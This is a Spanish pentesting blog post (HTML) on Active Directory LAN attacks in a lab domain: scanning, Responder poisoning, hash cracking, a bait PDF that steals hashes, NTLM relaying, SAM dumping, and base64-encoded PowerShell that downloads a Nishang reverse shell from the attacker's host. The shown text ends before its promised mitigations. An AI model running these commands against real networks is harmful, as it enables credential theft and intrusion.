@@ -1,0 +1,431 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Ataques Clasidos De AD en Lan // 0xl3mon🕷</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.7f004fbb8e19cf18afcf8a5fa13c66aae1fd075af8c583ae7b97a7b5aef1db40.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ataques Clasidos De AD en Lan"/>
+<meta name="twitter:description" content="La intención de este articulo mal redactado no es mas que meramente educativa, no me responsabilizo del mal uso que le den. Sin embargo del lado de las compañias podran entender como un atacante puede enumerar, reconocer y explotar protocolos comunes de autenticacion para en etapas posteriores comprometer todo un dominio.
+ Top Ataques comunes (AD en LAN) &#43; Mitigaciones  Reconocimiento inicial Enumeración Smbrelay Clasico Smbrelay &#43; Ntlmteft Cracking de Hashes Ntlmv2 Pass The Hash Mitm6 &#43; Ntlmrelay &#43; Nishang Mitm6 &#43; Ntlmrelay &#43; Socks Mitigaciones  Reconocimiento En este articulo rasparemos un poco sobre distintas metodologias a la hora de enumerar activos en una red, y a su posterior etapa de explotacion."/>
+
+    <meta property="og:title" content="Ataques Clasidos De AD en Lan" />
+<meta property="og:description" content="La intención de este articulo mal redactado no es mas que meramente educativa, no me responsabilizo del mal uso que le den. Sin embargo del lado de las compañias podran entender como un atacante puede enumerar, reconocer y explotar protocolos comunes de autenticacion para en etapas posteriores comprometer todo un dominio.
+ Top Ataques comunes (AD en LAN) &#43; Mitigaciones  Reconocimiento inicial Enumeración Smbrelay Clasico Smbrelay &#43; Ntlmteft Cracking de Hashes Ntlmv2 Pass The Hash Mitm6 &#43; Ntlmrelay &#43; Nishang Mitm6 &#43; Ntlmrelay &#43; Socks Mitigaciones  Reconocimiento En este articulo rasparemos un poco sobre distintas metodologias a la hora de enumerar activos en una red, y a su posterior etapa de explotacion." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/posts/ataques-clasidos-de-ad-en-lan/" />
+<meta property="article:published_time" content="2022-04-14T16:03:40+02:00" />
+<meta property="article:modified_time" content="2022-04-14T16:03:40+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/cat-profile.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon🕷</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Ataques Clasidos De AD en Lan</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          14 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <blockquote>
+<p>La intención de este articulo mal redactado no es mas que meramente educativa, no me responsabilizo del mal uso que le den. Sin embargo del lado de las compañias podran entender como un atacante puede enumerar, reconocer y explotar protocolos comunes de autenticacion para en etapas posteriores comprometer todo un dominio.</p>
+</blockquote>
+<h2 id="top-ataques-comunes-ad-en-lan--mitigaciones">Top Ataques comunes (AD en LAN) + Mitigaciones</h2>
+<ul>
+<li>Reconocimiento inicial</li>
+<li>Enumeración</li>
+<li>Smbrelay Clasico</li>
+<li>Smbrelay + Ntlmteft</li>
+<li>Cracking de Hashes Ntlmv2</li>
+<li>Pass The Hash</li>
+<li>Mitm6 +  Ntlmrelay + Nishang</li>
+<li>Mitm6 + Ntlmrelay + Socks</li>
+<li>Mitigaciones</li>
+</ul>
+<h3 id="reconocimiento">Reconocimiento</h3>
+<p>En este articulo rasparemos un poco sobre distintas metodologias a la hora de enumerar activos en una red, y a su posterior etapa de explotacion. El objetivo sera mas ser  una guia practica  sobre los vectores de ataque mas comunes en las auditorias de red con acceso a la lan , le aconsejo investigar o al menos entender por arriba sobre como funcionan los distintos mecanismos o protocolos de autenticacion windows o en un directorio activo.</p>
+<p><strong>Ping</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ping -c <span style="color:#ae81ff">2</span> 10.10.124.125
+</code></pre></div><p>lo que hacemos con la utilidad <code>ping</code>  es basicamente enviar un paquete <strong>ICMP</strong> del tipo <code>echo request</code> para comprobar el estado de comunicacion entre nuestro equipo y el host de destino, es decir si el host esta activo nos devolvera la peticion ICMP con un <code>echo reply</code>.</p>
+<p>Aunque con esto no quiero decir que en el caso de que un servidor no nós devuelva la petición el host está apagado si no que a lo mejor se establecieron reglas de firewall para bloquear ese tipo de solicitudes ICMP con el fin de evitar la enumeracion de equipos activos en una red.</p>
+<h4 id="un-poco-de-nmap">Un poco de Nmap</h4>
+<p><img src="https://i.imgur.com/VfyH9TN.png" alt=""></p>
+<p>Lo mas basico primero seria comprobar que equipos estan activos dentro de un segmento de red y por sobre todo reconociendo la red con el uso de herramientas como  <strong>Nmap</strong>, <strong>Crackmapexec</strong>, <strong>Masscan</strong>, <strong>Rustscan</strong></p>
+<p><strong>nmap</strong> tiene extensas funcionalidades no sólo para descubrimiento. Sí a eso le sumas su motor de scripts <strong>NSE</strong>, donde puedes agregar funcionalidades extras , es decir nos sirve para <strong>recon</strong>, <strong>enumeracion</strong> e inclusive <strong>explotacion</strong>, a continuacion mostraremos unos ejemplos interesantes con las siguientes opciones.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">--packet-trace: flag para mostrar un sumario de cada paquete que se envia y se recibe.
+
+-sP : nos sirve para sondear la red (envia paquetes echo reply ICMP, y espera su respuesta).
+
+-n : Para que no haga una resolucion dns es decir, que no convierta el ip a nombre de dominio a traves de una consulta DNS
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -n -sP 10.10.124.155 --packet-trace
+
+</code></pre></div><p><img src="https://i.imgur.com/7g00QPd.png" alt=""></p>
+<p>Probando Distintos modos de escaneo con Nmap : SYN <strong>(Sigiloso y eficiente)</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">1. -sS : Un Scaneo sigiloso del tipo TCP/SYN , es un escaneo rapido y eficiente no es restringido por firewalls 
+
+2. -sT : Similar al escaneo TCP/SYN anterior con la diferencia de que este completa la conexion para despues despues finalizarla 
+</code></pre></div><p>para entender los siguientes tipos de escaneo miremos las imagenes a continuación</p>
+<ol>
+<li><strong>Escaneo sigiloso SYN</strong> ya que no completa su conexion envia el paquete SYN, recibe el SYN/ACK pero no responde con un ACK para completar el saludo de 3 vias <strong>(3 way handshake)</strong> si no que envia un paquete <strong>RST</strong> para decirle que hubo un error y que reinicie la conexion.</li>
+</ol>
+<p><img src="https://i.imgur.com/uS4h1u5.png" alt="">
+En en caso de que el escaneo SYN sigiloso no sea efectivo, tiraremos de un escaneo <strong>TCP</strong> (siguiente ejemplo)</p>
+<ol start="2">
+<li><strong>Escaneo TCP</strong> a diferencia del escaneo anterior completamos la conexion con nuestro paquete ACK es decir enviamos nuestro paquete SYN el servidor nos reponde con un SYN/ACK , le devolvemos el ACK (completando el 3 way handshake) y le respondemos con UN RST para que finalize la conexion o la reinicie</li>
+</ol>
+<p><img src="https://i.imgur.com/ZCmcoAT.png" alt=""></p>
+<p>Aqui comprobaremos los puertos abiertos, especificandole a nmap que queremos las siguientes opciones :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">-sS : TCP SYN <span style="color:#f92672">(</span>sigiloso<span style="color:#f92672">)</span>
+--min-parallelism : especifica el número mínimo de operaciones de escaneo de puertos paralelos. es decir para que divida la operacion en problemas mas pequeños y sea <span style="color:#f92672">(</span>eficiente<span style="color:#f92672">)</span>
+--max-rtt-timeout :  se utiliza para especificar el tiempo de espera máximo de RTT <span style="color:#f92672">(</span>tiempo de ida y vuelta<span style="color:#f92672">)</span> para una respuesta de paquete
+-p- : Todos los puertos, parecido a -p 1-65535 en rango de enteros
+--open : Con estado open/abierto
+-n : No haga resolucion DNS
+-Pn : No haga descubrimiento con ICMP, osea no envie el paquete ECHO REQUEST y se quede esperando su respuesta ECHO REPLY
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sS --min-parallelism <span style="color:#ae81ff">1000</span> --max-rtt-timeout 100ms -p- --open 10.10.124.155 -n -Pn -vvv
+</code></pre></div><p><img src="https://i.imgur.com/XCLbxJB.png" alt=""></p>
+<h4 id="rustscan">Rustscan</h4>
+<p><strong>Enumeracion Basica con Rustscan</strong></p>
+<p>Scanner para mapear redes escrito en RUST bastante rapido (Nmap puede ser igual de rapido si jugamos con las opciones correctas), para usarlo como complemento de nmap esta bastante bien, ya que puedes usarlo junto con nmap es decir puedes utilizar rust para recon y nmap para enumerar versiones y servicios de los puertos anteriormente reconocidos ejemplo:</p>
+<pre><code>rustscan -a 10.10.124.132 --ulimite 5000 -- -n -Pn 
+</code></pre><p><img src="https://i.imgur.com/RHAedzt.png" alt="" title="Rustscan"></p>
+<h4 id="crackmapexec">Crackmapexec</h4>
+<p>La <strong>navaja suiza</strong> del pentesting, escrita en python sirve tanto para enumeracion tambien como para postexplotacion, utiliza librerias de impackets en su suite , soporta distintos protocolos como <strong>mssql,ssh,winrm,ldap,smb</strong>con ella la creatividad juega un rol importate.</p>
+<p>Podemos hacer un sin fin de cosas desde fuerza bruta a ofuzcar scripts en powershell, utilizar arhivos customs de AMSI bypass, subir, ejecutar, ficheros, dumpear hashes, lo podemos utilizar para movimiento lateral con pass the hash y demas. es decir es una <strong>Navaja Suiza</strong> literal.</p>
+<ul>
+<li><strong>Recon Basica Crackmapexec</strong></li>
+</ul>
+<p>Mapeando la red de un dominio para listar informacion interesante para etapas posteriores de explotación.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cme -t <span style="color:#ae81ff">200</span> smb 10.10.124.0./24 --gen-relay-list NotSmbSigning.txt
+</code></pre></div><p><img src="https://i.imgur.com/wD0BuJS.png" alt=""></p>
+<ul>
+<li><strong>Listar Modulos con crackmapexec</strong></li>
+</ul>
+<p>Como vemos toda una seccion de modulos enteros como por ejemplo lograr ejecutar un ingestor de Bloodhound para recopilar informacion de todo el dominio este paso nos ahorra muchisimo tiempo para no andar jugando con la red e ir directamente a donde queremos llegar.</p>
+<p><img src="https://i.imgur.com/p0RZds2.png" alt=""></p>
+<ul>
+<li><strong>Enumeracion basica con crackmapexec</strong></li>
+</ul>
+<p>Ejemplo de enumeracion basica con un usario con bajos privilegios en la red de un dominio con crackmapexec.</p>
+<pre><code>cme -t 200 smb 10.10.124.0/24 -u Consultant -p Password123! -d child.evilcorp.local --shares --session --loggedon-users --local-groups
+</code></pre><p><img src="https://i.imgur.com/8Hl5P6O.png" alt=""></p>
+<p>logramos enumerar sesiones logueados, recursos compartidos , y algunos grupos locales.</p>
+<p>Esto es un pequeño ejemplo de todo lo que puede hacer con CRACKMAPEXEC incluyendo que tambien puede lograr <strong>Remote Code Execution</strong> con distintos metodos como wmiexec, atexec, smbexec, mmcexec, winrm lo invito a que juegue un poco con el en su laboratorio.</p>
+<ul>
+<li><strong>RCE</strong> Informacion util a tener en cuenta a la hora de queres ejecutar comandos con cuentas privilegiadas</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Metodo</th>
+<th>Tipo de RCE</th>
+<th>Puertos usados</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Wmiexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP:(135, 445, 50911)</td>
+</tr>
+<tr>
+<td>Atexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP: 445</td>
+</tr>
+<tr>
+<td>Smbexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP: 445</td>
+</tr>
+<tr>
+<td>Mmcexec</td>
+<td>Cmd/Powershell</td>
+<td>TCP:(135,445,49751 DCOM)</td>
+</tr>
+<tr>
+<td>winrm</td>
+<td>Cmd/Powershell</td>
+<td>TCP:(5985, 5986)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="smb-relay-clasico-ipv4">Smb Relay Clasico IPV4</h2>
+<h4 id="responder">Responder</h4>
+<p>Responder es un envenenador de trafico y sniffer que hace de Man in the Midle envenenando trafico de distintos protocolos como <strong>NBT-NS</strong>,<strong>LLMNR</strong>, <strong>NTLM</strong>, <strong>SMB</strong>, <strong>MSSQl</strong> .</p>
+<p><strong>LLMNR/NBT-NS</strong>: Se utiliza como alternativa de resolucion de nombres cuando el DNS no esta funcionando correctamente.</p>
+<p><img src="https://i.imgur.com/hRTz3tJ.png" alt=""></p>
+<ul>
+<li>Crackeando el hash <strong>netntlmv2</strong> capturado por el responder</li>
+</ul>
+<ol>
+<li>Identificamos el tipo de hash</li>
+<li>le indicamos a john el formato del hash y el diccionario junto con el hash</li>
+<li>crackeamos el hash</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat &gt; hash
+ 
+hashid -j hash
+ 
+john --format<span style="color:#f92672">=</span>netntlmv2 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+ 
+john hash --show
+</code></pre></div><p><img src="https://i.imgur.com/MOFz1mA.png" alt=""></p>
+<h4 id="capturando-hashes-con-ntlm_theft--smbrelay">Capturando Hashes con ntlm_theft + Smbrelay</h4>
+<p>Conseguir credenciales de acceso válidas en la mayoría de los casos es fundamental para continuar con etapas posteriores de post explotacion, en este caso realizaremos una pequeña prueba de con la herramienta <strong>ntlm_theft</strong> que basicamente lo que hace es generar un template de un fichero apuntando hacia nuestro servidr con el responder (donde estaremos envenenando la red) para capturar hashes en este caso lo que haremos sera</p>
+<ol>
+<li>Crear el fichero malicioso para subirlo a un recurso de la red</li>
+<li>Subir ese fichero con smbmap/crackmapexec (ya que disponemos de credenciales de bajo privilegio)</li>
+<li>Ejecutar el responder para que este en escucha envenenando las conexiones para extrar hashes.</li>
+<li>Esperar a que el usuario victima haga click en el recurso y su trafico sea redirigido a nuestro servidor con el responder activo</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 ntlm_theft.py
+
+python3 ntlm_theft.py --server 10.10.124.240 --generate pdf -f cheque_a_cobrar.pdf
+</code></pre></div><ul>
+<li>Creacion del fichero con <strong>ntlm_theft</strong></li>
+</ul>
+<p><img src="https://i.imgur.com/gkNTOt3.png" alt=""></p>
+<ul>
+<li>Enumeramos la carpeta con permisos de escritura, para subir nuestro archivo malicioso.</li>
+<li>Subimos el fichero con smbmap, ya que enumeramos anteriormente con crackmapexec y nos dimos cuenta que hay una carpeta con permisos de escritura.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155
+
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$
+
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant
+
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant  --upload cheque_bancario.pdf
+SharedFolder<span style="color:#ae81ff">\$</span>/consultant/cheque_bancario.pdf
+
+</code></pre></div><p><img src="https://i.imgur.com/1F68Ocd.png" alt=""></p>
+<p>Una vez subido nuestro fichero malicioso creado con <strong>ntlm_theft</strong>, esperamos a que alguien curioso quiera fijarse que clase de cheque bancario es.</p>
+<p><img src="https://i.imgur.com/mtLKzeE.png" alt=""></p>
+<p>Y en nuestro responder veremos que la persona que abrio nuestro pdf es una cuenta con privilegios de administrador, podriamos intentar crackearlo y con suerte nos hacemos con el dominio entero</p>
+<p><img src="https://i.imgur.com/bWto63j.png" alt=""></p>
+<p>a continuación intentaremos ejecutar un comando remoto &lsquo;whoami&rsquo; a modo de prueba, para despues terminar dumpeando la sam local o bien el ntds del dominio , para poder hacer <strong>pass the hash</strong>, aunque ya teniendo una cuenta privilegiada, podemos activar el modulo de RDP con crackmapexec o simplemente loguearnos por <strong>WINRM</strong> en el caso de que tenga el puerto 5987 y si no lo tiene abierto podemos habilitarlo quitando las reglas de firewall ya que tenemos ejecucion remota de comando a traves del smb.</p>
+<p><img src="https://i.imgur.com/aEATcdm.png" alt=""></p>
+<h2 id="ntlm-relay">NTLM Relay</h2>
+<p><strong>NTLM</strong> es un protocolo de estilo de <code>desafio/respuesta</code> que se usa conmunmente }en windows para la autenticacion entre clientes y servidores.
+Los protocolos (que requieren autenticacion de un usuario) y lo utilizan son  <strong>HTTP</strong>, <strong>SMB</strong>, <strong>SMTP</strong> . Es decir <strong>NTLM</strong> estan integrado en ellos.</p>
+<p>El proceso que realiza NTLM para la autenticacion es el siguiente :</p>
+<ol>
+<li>
+<p>El cliente intenta iniciar sesión en un servidor enviando un paquete <strong>NEGOTIATE_MESSAGE</strong></p>
+</li>
+<li>
+<p>El servidor le responde con un <strong>CHALLENGE_MESSAGE</strong> para darle la oportunidad al cliente de que se identifique, Este desafio <strong>(o nonce)</strong> es un numero aleatorio que debe ser encriptado por el cliente con su hash de contraseña</p>
+</li>
+<li>
+<p>Finalmente el cliente responde con un <strong>AUTHENTICATE_MESSAGE</strong> que incluye el desafio encriptado, el nombre de usuario, el nombre de host o el nombre del dominio.</p>
+</li>
+<li>
+<p>El servidor verifica el desafio con el hash de la contraseña y se asegura si es el correcto, para aceptar o denegar su autentitacion</p>
+</li>
+</ol>
+<p><img src="https://i.imgur.com/bCKr9FN.png" alt=""></p>
+<blockquote>
+<p>Nota los hashes Net-NTLMv2 no se pueden usar para ataques Pass-The-Hash (PTH) solo sirven para crackearlos con john o hashcat, los hashes NTLMv1 si sirven para Pass the hash.</p>
+</blockquote>
+<p>Entendiendo el concepto anterior procederemos a realizar un ataque <strong>NTLM Relay</strong> utilizando <strong>responder</strong> y <strong>ntlmrelay</strong> de impacket</p>
+<ol>
+<li>Identificamos nuevamente los hosts que no requieren firmado</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">crackmapexec -t <span style="color:#ae81ff">200</span> smb 10.10.40.0/24 --gen-relay-list targets.txt
+
+--gen-relays-list : Devuelve la direccion de todos aquellos hosts que no requieran SMB certificado <span style="color:#f92672">(</span>Vulnerables a distintos tipos de ataques de relay<span style="color:#f92672">)</span>
+</code></pre></div><p><img src="https://i.imgur.com/V3O0fJk.png" alt=""></p>
+<p>como hemos nombrado anteriormente <strong>SMB Signing</strong> es una función de seguridad de smb que evita los ataques de relay pidiendo la autenticidad del destinatario. Sin embargo es frecuente encontrarlo deshabilitado para admitir dispositivos heredados o mejorar la velocidad de la red.</p>
+<ol start="2">
+<li>Procedemos a desabilitar el protocolo <strong>Smb y HTTP</strong> de la configuracion del responder <code>/etc/responder/responder.conf</code> esto es por que <strong>ntlmrelay</strong>  utiliza los puertos <strong>SMB/HTTP</strong></li>
+</ol>
+<p><img src="https://i.imgur.com/I327HNU.png" alt=""></p>
+<ol start="3">
+<li>ejecutamos ntlmrelay para que se ponga a la espera por hashes capturados con el responder para intentar autenticarse en los objetivos que no requieran smb firmado.</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 ntlmrelayx.py  -smb2support -tf /tmp/AD/targets.txt
+
+-smb2support : soporte de smbv2 antiguo
+-tf : archivo que contiene los ip de los hosts que no requieren smb firmado donde intentara loguearse con el relay del hash capturado . <span style="color:#f92672">(</span>una ip por linea<span style="color:#f92672">)</span> 
+
+</code></pre></div><p><img src="https://i.imgur.com/qPDYv56.jpg" alt=""></p>
+<p>aparentemente hay cuentas en el dominio que poseen privilegios sobre otros hosts, y de los cuales con ese relay de smb del usuario con privilegio podemos DUMPEAR la <strong>SAM</strong> para realizar un pass the hash o intentar crackearlos.</p>
+<h2 id="ntlmrelay-with-proxy-socks">Ntlmrelay with Proxy socks</h2>
+<ol>
+<li>Similar al ataque anterior con la diferencia de que solo le agregamos el parametro <code>-socks</code> para eso primero nos ponemos en escucha con el <strong>responder</strong></li>
+</ol>
+<pre><code>responder -I ens38
+</code></pre><ol start="2">
+<li>nos aseguramos de que en nuestro archivo de configuracion de <strong>proxychains</strong> <code>/etc/proxychains.conf</code>  tengamos seteado el puerto correcto para el tunel socks que utilizaremos en el relay</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>ProxyList<span style="color:#f92672">]</span>
+<span style="color:#75715e"># add proxy here ...</span>
+<span style="color:#75715e"># meanwile</span>
+<span style="color:#75715e"># defaults set to &#34;tor&#34;</span>
+socks4  127.0.0.1 <span style="color:#ae81ff">1080</span>
+</code></pre></div><ol start="3">
+<li>ejecutamos el ntlmrelay para que inicie el servidor que retransmitira el hash a nuestro tunel socks</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 ntlmrelayx.py -socks -smb2support -tf /tmp/AD/targets.txt
+-socks : Utilizaremos un socket para tunnelizar el trafico hacia nosotros
+</code></pre></div><p><img src="https://i.imgur.com/ChdwXmN.png" alt=""></p>
+<ol start="4">
+<li>como vemos tenemos una cuenta que tiene privilegios de administrador en otros equipos y al tener el relay lo que hacemos ahora,  es intentar loguearnos atraves del tunnel con proxychains sin especificar contraseña</li>
+</ol>
+<p><img src="https://i.imgur.com/F2ahhaO.png" alt=""></p>
+<p>asi de sencillo nos logueamos utilizando el relay de smb que contiene lo hashes para la autenticación con herramientas como <strong>smbexec</strong>, <strong>psexec</strong>, <strong>wmiexec</strong> etc.</p>
+<h2 id="ntlmrelay-nishang">Ntlmrelay Nishang</h2>
+<p>con ntlmrelay tenemos la capacidad de ejecutar comandos remotos, que podria ser bastante util para obtener una reverse shell, mas si ocultamos la peticion al recurso de nishang en base64  <code>Invoke-PowerShellTCP</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 ntlmrelayx.py -smb2support -tf /tmp/AD/target.txt -c <span style="color:#e6db74">&#39;powershell -nop -w hidden -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADQAMAAuADIANQA6ADYAMAA2ADAALwBwAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==&#39;</span>
+
+</code></pre></div><p><img src="https://i.imgur.com/1P8KIbr.png" alt=""></p>
+<p>Obtenemos nuestra reverse shell =).</p>
+<p><img src="https://i.imgur.com/NK1URsg.png" alt=""></p>
+<h2 id="ntlmrelay-con-secrets-dump">Ntlmrelay con Secrets Dump</h2>
+<p>utilizaremos el relay capturado  para poder poder volcar los hashes de <strong>SAM y LSASS secrets</strong> con la herramienta <strong>secretsdump</strong>. Esta tecnica nos dara la posibilidad de movernos laternalmente ya que es probable que consigamos hashes de cuentas del dominio, o en el mejor de los casos cuentas de servicios con credenciales en texto plano</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">proxychains python3 secretsdump.py dev/c.rodolfo@10.10.40.223 -no-pass
+
+</code></pre></div><p><img src="https://i.imgur.com/n59YHV7.png" alt=""></p>
+<h2 id="mitm6-with-ntlmrelay-ipv6-y-nishang">MITM6 With NtlmRelay IPV6 y Nishang</h2>
+<blockquote>
+<p>IPV6 es la version mas reciente de IPV4, y en muchos ambitos un protocolo mas descuidado en las compañias ya que uno generalmente se centra en mitigar vulnerabilidades del protocolo mas usado hasta el momento <strong>(IPV4)</strong> aunque en unos no sera así.</p>
+</blockquote>
+<p>a continuaciòn realizaremos una prueba haciendo un ataque <strong>mitm6</strong> junto con ntlmrelay para injectar un comando haciendo una peticio a un servidor web local para hostear el recurso de nishang para obtener una revese shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Mitm6</span>
+mitm6 -i ens38 -d dev.evilcorp.local --ignore-nofqdn
+-i : interface 
+-d : dominio
+--ignore-nofqdn : ignora las consultas dhcpv5 que no contengan el nombre de domini ocompleto
+
+<span style="color:#75715e"># Ntlmrelay</span>
+python3 ntlmrelayx.py -t smb://10.10.40.226 -c <span style="color:#e6db74">&#39;c:\windows\SysWow64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc ADAALwBzAGgAZQBsAGwALgB[..B64-Request..]wAHMAMQAiACkACgA=&#39;</span> -wh 10.10.40.225 -smb2support
+
+-t : target
+-c : commando a ejecutar
+-wh : habilita el servicio de un archivo WPAD <span style="color:#f92672">(</span>Web Proxy Auto-Discovery<span style="color:#f92672">)</span>  para la autenticacion del proxy, o sea nosotros somos el servicio en este caso
+
+<span style="color:#75715e"># Http.server</span>
+python3 -m http.server <span style="color:#ae81ff">8080</span>
+
+</code></pre></div><p><img src="https://i.imgur.com/LWxYDVc.png" alt=""></p>
+<h2 id="mitm6-con-ntlmrelay--socks">MITM6 con NTLMRELAY + Socks</h2>
+<p>La intencion es la misma con la diferencia de que guardamos el relay capturado para despues tunelizarlo con proxychains con el fin de lograr autenticarnos.</p>
